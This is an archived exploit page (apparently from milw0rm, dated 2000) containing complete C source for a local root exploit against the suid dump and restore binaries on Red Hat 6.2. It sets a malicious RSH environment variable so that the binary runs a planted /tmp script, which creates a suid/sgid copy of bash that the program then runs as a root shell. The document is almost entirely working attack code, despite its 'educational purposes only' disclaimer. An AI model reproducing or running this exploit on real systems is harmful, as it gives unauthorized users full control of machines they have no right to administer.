<html><head><title>dump 0.4b15 exploit (Redhat 6.2)</title></head><pre>/*
**
**  dump-0.4b15x.c
**
**  dump-0.4b15 exploit:
**  Redhat 6.2 dump command executes
**  external program with suid priviledge.
**
**  affected:
**     /sbin/dump
**     /sbin/dump.static
**     /sbin/restore
**     /sbin/restore.static
**
**  Bug found by mat@hacksware.com
**
**  This example was coded by md0claes@mdstud.chalmers.se
**  It was written for EDUCATIONAL PURPOSES ONLY.
**
**
*/

#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;

#define RUNME     &quot;/tmp/runme&quot;      	/* tmp file		   */
#define SUID_PATH &quot;/tmp/superdude&quot;		/* the power of root */

void usage(char *pname)
{
 fprintf(stdout, &quot;\nUsage: %s &lt; d | s | r | p &gt;\n\n&quot;, pname);
 fprintf(stdout,   &quot;  d - exploit /sbin/dump\n&quot;);
 fprintf(stdout,   &quot;  s - exploit /sbin/dump.static\n&quot;);
 fprintf(stdout,   &quot;  r - exploit /sbin/restore\n&quot;);
 fprintf(stdout,   &quot;  p - exploit /sbin/restore.static\n\n&quot;);
}

int main(int argc, char *argv[], char *envp[])
{
 int fd;
 pid_t pid;
 char *bad_env[] = { &quot;TAPE=garbage:garbage&quot;, &quot;RSH=&quot;RUNME };
 char   runbuf[] = { &quot;#!/bin/sh\n/bin/cp /bin/bash &quot;
                    SUID_PATH &quot;\nchmod 6755 &quot; SUID_PATH };

 char *suid[] = { SUID_PATH, NULL };
 char   *av[] = { &quot;/sbin/restore.static&quot;, &quot;restore.static&quot;,
                  &quot;-t&quot;, &quot;/tmp/foo&quot; };

 if (argc != 2) {
  usage(argv[0]);
  exit(1);
 }

 switch(tolower(argv[1][0])) {

  case 'd':
   av[0] = &quot;/sbin/dump&quot;;
   av[1] = &quot;dump&quot;;
   av[2] = &quot;-0&quot;;
   av[3] = &quot;/&quot;;
   break;

  case 's':
   av[0] = &quot;/sbin/dump.static&quot;;
   av[1] = &quot;dump.static&quot;;
   av[2] = &quot;-0&quot;;
   av[3] = &quot;/&quot;;
   break;

  case 'r':
   av[0] = &quot;/sbin/restore&quot;;
   av[1] = &quot;restore&quot;;
   break;

  case 'p':
   break;

  default:
   usage(argv[0]);
   exit(1);
 }

 if ((fd = open(RUNME,O_WRONLY|O_CREAT|O_TRUNC, 0755)) == -1) {
  perror(&quot;fopen&quot;);
  exit(1);
 }

 if (write(fd, runbuf, sizeof(runbuf)) == -1) {
  perror(&quot;write&quot;);
  exit(1);
 }
 close(fd);

 if ((pid = fork()) &lt; 0) {
  perror(&quot;fork&quot;);
  exit(1);
 }

 else if (pid == 0) {
  if (execle(av[0], av[1], av[2], av[3], NULL, bad_env) &lt; 0) {
   perror(&quot;execle&quot;);
   _exit(1);
  }
 }

 sleep(1);
 unlink(RUNME);
 fprintf(stdout, &quot;\nExploited %s \n&quot;, av[0]);
 fprintf(stdout, &quot;Running &quot; SUID_PATH &quot;\n&quot;);
 execve(SUID_PATH, suid, envp);

 exit(0);
}


// milw0rm.com [2000-11-29]</pre></html>